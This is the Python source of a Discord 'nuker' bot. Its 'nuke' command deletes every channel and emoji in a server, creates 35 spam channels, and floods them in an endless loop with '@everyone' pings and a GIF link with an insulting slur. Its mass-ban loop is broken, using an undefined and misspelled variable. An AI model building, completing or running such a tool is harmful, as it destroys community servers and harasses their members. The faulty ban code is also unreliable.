import random
from discord.ext import commands
import discord
import json
import os
from colorama import Fore
import colorama
colorama.init()

B = Fore.LIGHTBLUE_EX
W = Fore.RESET
G = Fore.GREEN
R = Fore.RED

with open("config.json", "r") as f:
    js = json.load(f)

token = js["token"]
prefix = js["prefix"]
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

def main():
    os.system("cls")
    os.system("title  ")
    os.system("mode 59, 41")
    print(f"""{B} 
 █hi█
""")
    print(f"{W} Connected: {B}{bot.user}{W} | Prefix: {B}{prefix}\n")
    print(f"{W} Type {B}{prefix}nuke{W} to nuke the server.\n")

@bot.event
async def on_ready():
    main()

@bot.command()
async def nuke(ctx):
    os.system("mode 86, 41")
    os.system("cls")
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"{G}[+] Deleted channel #{channel.name} [{channel.id}]")
        except:
            print(f"{R}[-] Failed to delete channel #{channel.name} [{channel.id}]")
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            print(f"{G}[+] Deleted emoji :{emoji.name}:")
        except:
            print(f"{R}[-] Failed to delete emoji :{emoji.name}:")
    for i in range(35):
        try:
            c = await ctx.guild.create_text_channel("aaron")
            print(f"{G}[+] Created channel {c.name} [{c.id}]")
        except:
            print(f"{R}[-] Failed to create channel")
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await member.ban()
                print(f"{G}[+] Banned member {meber.name}#{member.discriminator} [{member.id}]")
            except:
                print(f"{R}[-] Failed to ban member {member.name}#{member.discriminator} [{member.id}]")

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "aaron":
        while True:
            try:
                await channel.send("@everyone "+random.choice(["https://tenor.com/view/hi-hello-sup-whores-whore-gif-21232848"]))
                print(f"{G}[+] Message sent in #{channel.name} [{channel.id}]")
            except:
                print(f"{R}[-] Failed to send message in #{channel.name} [{channel.id}]")

bot.run(token)